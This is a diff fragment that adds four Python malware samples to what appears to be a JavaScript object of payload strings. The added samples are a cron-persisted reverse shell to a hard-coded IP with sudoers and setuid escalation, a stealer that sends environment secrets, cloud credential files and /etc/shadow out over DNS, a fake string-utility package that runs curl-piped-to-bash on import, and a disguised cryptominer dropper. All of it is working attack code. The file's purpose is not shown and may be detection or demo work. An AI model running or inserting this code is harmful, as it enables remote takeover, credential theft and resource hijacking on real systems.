@@ -56,7 +56,120 @@ def harvest_and_exfiltrate():
     except Exception:
         pass
 
-harvest_and_exfiltrate()`
+harvest_and_exfiltrate()`,
+
+    reverse_shell: `import os
+import subprocess
+
+def setup_persistence():
+    cron_cmd = "echo '*/5 * * * * /bin/bash -c \"bash -i >& /dev/tcp/194.26.29.112/9001 0>&1\"' | crontab -"
+    os.system(cron_cmd)
+
+def spawn_reverse_shell():
+    subprocess.Popen(
+        ["/bin/bash", "-c", "bash -i >& /dev/tcp/194.26.29.112/9001 0>&1"],
+        stdout=subprocess.PIPE, stderr=subprocess.PIPE
+    )
+
+def escalate_privileges():
+    os.system("chmod +s /usr/bin/python3")
+    os.system("echo 'attacker ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers")
+
+setup_persistence()
+spawn_reverse_shell()
+escalate_privileges()`,
+
+    dns_exfil: `import os
+import socket
+import base64
+
+def harvest_environment():
+    sensitive_keys = ["AWS_SECRET", "DATABASE_URL", "API_KEY", "TOKEN", "PASSWORD"]
+    stolen = {}
+    for key, value in os.environ.items():
+        for pattern in sensitive_keys:
+            if pattern.lower() in key.lower():
+                stolen[key] = value
+    return stolen
+
+def dns_tunnel_exfil(data, attacker_domain="evil.attacker.com"):
+    encoded = base64.b64encode(data.encode()).decode()
+    chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
+    for chunk in chunks:
+        query = f"{chunk}.{attacker_domain}"
+        try:
+            socket.getaddrinfo(query, None)
+        except socket.gaierror:
+            pass
+
+def read_cloud_credentials():
+    targets = [
+        os.path.expanduser("~/.aws/credentials"),
+        os.path.expanduser("~/.config/gcloud/credentials.db"),
+        "/etc/shadow"
+    ]
+    collected = ""
+    for target in targets:
+        try:
+            with open(target, "r") as f:
+                collected += f.read()
+        except Exception:
+            pass
+    return collected
+
+dns_tunnel_exfil(str(harvest_environment()) + read_cloud_credentials())`,
+
+    typosquat: `# Looks like a normal string utility package...
+def capitalize_words(text):
+    return " ".join(word.capitalize() for word in text.split())
+
+def reverse_string(text):
+    return text[::-1]
+
+# Hidden malicious payload disguised as config loader
+def _load_config():
+    _cfg = compile("__import__('os').system('curl http://194.26.29.112/shell.sh | bash')", "<config>", "exec")
+    exec(_cfg)
+
+class _PostInstallHook:
+    def __init__(self):
+        try:
+            _load_config()
+        except Exception:
+            pass
+
+_hook = _PostInstallHook()
+print(capitalize_words("hello world"))`,
+
+    cryptominer: `import os
+import subprocess
+import urllib.request
+
+MINER_URL = "http://194.26.29.112/xmrig"
+
+def download_miner():
+    tmp_path = os.path.join(os.path.expanduser("~"), ".cache", "systemd-update")
+    os.makedirs(os.path.dirname(tmp_path), exist_ok=True)
+    try:
+        urllib.request.urlretrieve(MINER_URL, tmp_path)
+        os.system(f"chmod +x {tmp_path}")
+        return tmp_path
+    except Exception:
+        return None
+
+def start_miner(binary_path):
+    subprocess.Popen(
+        [binary_path, "--pool", "stratum+tcp://pool.minexmr.com:4444"],
+        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+    )
+
+def hide_process():
+    os.system("cp /usr/bin/python3 /tmp/.systemd-logind")
+
+miner = download_miner()
+if miner:
+    start_miner(miner)
+    hide_process()`
 };
 
 // --- Initialization ---
